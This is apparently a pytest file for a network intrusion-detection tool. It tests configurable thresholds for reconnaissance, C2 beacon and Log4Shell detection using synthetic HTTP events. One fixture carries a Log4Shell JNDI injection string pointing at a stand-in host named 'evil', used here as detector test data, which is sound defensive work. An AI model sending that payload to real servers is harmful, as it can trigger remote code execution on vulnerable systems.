from __future__ import annotations

import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.correlation.attack_chain import detect_attack_stages
from src.correlation.c2_detector import detect_c2
from src.event.models import HttpEvent
from src.live import prefilter


def test_attack_chain_thresholds_can_be_configured() -> None:
    events = [
        HttpEvent(
            event_id=f"scan-{idx}",
            timestamp=float(idx),
            src_ip="10.0.0.5",
            src_port=40000 + idx,
            dst_ip="10.0.0.10",
            dst_port=80,
            protocol="HTTP",
            payload_clean=f"GET /path-{idx} HTTP/1.1",
            summary="scan",
            method="GET",
            uri=f"/path-{idx}",
            host="victim",
            user_agent="browser",
            headers={},
        )
        for idx in range(3)
    ]
    assert not detect_attack_stages(events, [], {"recon_distinct_uri_threshold": 8})
    stages = detect_attack_stages(events, [], {"recon_distinct_uri_threshold": 3})
    assert any(stage["stage"] == "Reconnaissance" for stage in stages)


def test_c2_minimum_http_request_threshold_can_be_configured() -> None:
    events = [
        HttpEvent(
            event_id=f"beacon-{idx}",
            timestamp=float(idx * 10),
            src_ip="10.0.0.20",
            src_port=50000 + idx,
            dst_ip="203.0.113.10",
            dst_port=8080,
            protocol="HTTP",
            payload_clean="GET /checkin HTTP/1.1",
            summary="checkin",
            method="GET",
            uri="/checkin",
            host="c2",
            user_agent="agent",
            headers={},
            response_size=20,
        )
        for idx in range(3)
    ]
    assert not detect_c2(events, {"http_min_requests": 4})
    findings = detect_c2(events, {"http_min_requests": 3})
    assert findings and findings[0]["c2_type"] == "HTTP Beacon"


def test_prefilter_marker_weights_can_be_configured(monkeypatch, tmp_path) -> None:
    event = HttpEvent(
        event_id="pkt-1",
        timestamp=1.0,
        src_ip="10.0.0.5",
        src_port=44444,
        dst_ip="10.0.0.10",
        dst_port=80,
        protocol="HTTP",
        payload_clean="GET /?x=${jndi:ldap://evil/a} HTTP/1.1",
        summary="jndi",
        method="GET",
        uri="/?x=${jndi:ldap://evil/a}",
        host="victim",
        user_agent="curl",
        headers={},
    )
    monkeypatch.setattr(prefilter, "parse_network_events", lambda _: [event])
    config = {
        "detection": {
            "prefilter": {
                "marker_weights": {"critical": {"log4shell_jndi": 20}},
                "severity": {"critical_score": 85, "high_score": 60, "medium_score": 30},
                "max_score": 100,
            }
        }
    }
    result = prefilter.prefilter_pcap(tmp_path / "sample.pcap", min_risk_score=50, config=config)
    assert result.risk_score == 20
    assert result.severity == "critical"
    assert result.recommended_action == "deep_analysis"
